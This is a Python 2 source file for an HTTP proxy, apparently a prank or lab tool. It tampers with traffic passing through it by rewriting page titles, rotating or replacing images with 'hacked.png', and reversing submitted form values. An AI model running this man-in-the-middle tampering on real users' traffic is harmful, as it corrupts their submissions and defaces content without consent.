import BaseHTTPServer, SocketServer, SimpleHTTPServer
import random, sys ,socket, os
import cStringIO
from PIL import Image

MAX_DATA_RECV = 1*4096    # max number of bytes we receive at once


#**************************************
#********* MAIN PROGRAM ***************
#**************************************
def main():

    # check the length of command running
    if (len(sys.argv)<3):
        sys.exit('Usage: %s <server IP> <server port> \n example: python AnnoyingHttpServer.py 192.168.72.129 8080\n' % os.path.basename(__file__))
        
    # host and port info.
    host = sys.argv[1]      # blank for localhost
    port = int(sys.argv[2]) # port from argument
    
    annoying_httpd = ThreadingHTTPServer((host, port), AnnoyingHttpHandler)
    annoying_httpd.serve_forever()
        


class ThreadingHTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer, BaseHTTPServer.HTTPServer): 
    pass 



class AnnoyingHttpHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    The RequestHandler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """
    def processRequest(self, method='GET'):
        postdata = ''
        if method == 'POST':
            postdata = self.rfile.read(int(self.headers.get('Content-Length', '0')))
            
        message_parts = []
        hostname = ''
        for name, value in sorted(self.headers.items()):
            message_parts.append('%s: %s' % (name, value.rstrip()))
            if name == 'host':
                hostname = value.rstrip()
        message_parts.append('')
        request_headers = '\r\n'.join(message_parts)
        request = method + ' '+ self.path + ' HTTP/1.1\r\n'+request_headers+'\r\n'+postdata
        return request, hostname
        
        
        
    def do_GET(self):
        request, hostname = self.processRequest()
        self.sendRequest(request, hostname)
    
    def sendRequest(self, request, hostname):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(5)
            s.connect((hostname, 80))
            s.send(request)         # send request to webserver
            data = self.getData(s)
            data = self.annoyImage(data)
            data = self.annoyTitle(data)
            self.request.send(data)
            s.close()
        except socket.error:
            pass
        
    def extractData(self, data, begin_del, end_del):
        if data.find(begin_del) == -1:
            return ''
        data = data[data.find(begin_del)+len(begin_del):]
        return(data[:data.find(end_del)])
    
    def getData(self, s):       
        data = s.recv(MAX_DATA_RECV)
        try:
            content_length = int(self.extractData(data, 'Content-Length: ', '\n'))
        except:
            return data
        
        content_data_length = len(data[data.find('\r\n\r\n')+len('\r\n\r\n'):])
        
        while content_data_length < content_length:
            next_data = s.recv(MAX_DATA_RECV)
            if len(next_data)==0:
                break
            data += next_data
            content_data_length += len(next_data)
        return data
    
    
    
    def annoyTitle(self, data):
        title = self.extractData(data, '<title>', '</title>')
        if len(title) and title.find('Moved')==-1 and title.find('Found')==-1:
            data = data.replace('<title>'+title+ '</title>','<title>The Zombies Are Here!!! Run Away!!!</title>')
        return data
    
    def annoyImage(self, data):
        if data.find('image/png') > -1 or data.find('image/jpeg') > -1:
            loc = data.find('\r\n\r\n')
            img_data = data[loc + len('\r\n\r\n'):] 
            try:
                img = Image.open(cStringIO.StringIO(img_data))
            except:
                return data
            if random.randint(0,1):
                annoyed_img = self.annoyImageReplace(img)
            else: annoyed_img = self.annoyImageRotate(img)
            
            data = data[:loc] + '\r\n\r\n' + annoyed_img
            data = data.replace('image/jpeg', 'image/png')
            
            content_length = self.extractData(data, 'Content-Length: ', '\n')
            if len(content_length):
                data = data.replace('Content-Length: ' + content_length + '\n', 'Content-Length: ' + str(len(annoyed_img)) + '\n')
            
        return data
    
    def annoyImageReplace(self, img):
        try:
            img_size = img.size
        except:
            img_size = (216,166)    
        return self.getImage(Image.open('hacked.png').resize(img_size))    
    
    def annoyImageRotate(self, img):
        return self.getImage(img.rotate(180))
        
        
    def getImage(self, img):    
        s = cStringIO.StringIO()
        img.save(s, "png")
        return s.getvalue()
        
    def annoyPostData(self, postdata):
        params = postdata.split('&')
        annoyed_post_data = ''
        for i in range(len(params)):
            p = params[i].split('=')
            annoyed_post_data += p[0]+'='
            if p[0].find('Submit')==-1:
                try:
                   annoyed_post_data += p[1][::-1]+'&'
                except:
                   pass
            else: annoyed_post_data += p[1]+'&'
        #print 'Modified data: ' + annoyed_post_data
        return annoyed_post_data[:-1]
            
            
            
    def do_POST(self):
        request, hostname = self.processRequest('POST')
        postdata = request[request.find('\r\n\r\n'):]
        annoyed_post_data = self.annoyPostData(postdata)
        request = request.replace(postdata, annoyed_post_data)
        self.sendRequest(request, hostname)
        
#********** END PROXY_THREAD ***********
    
if __name__ == '__main__':
    main()
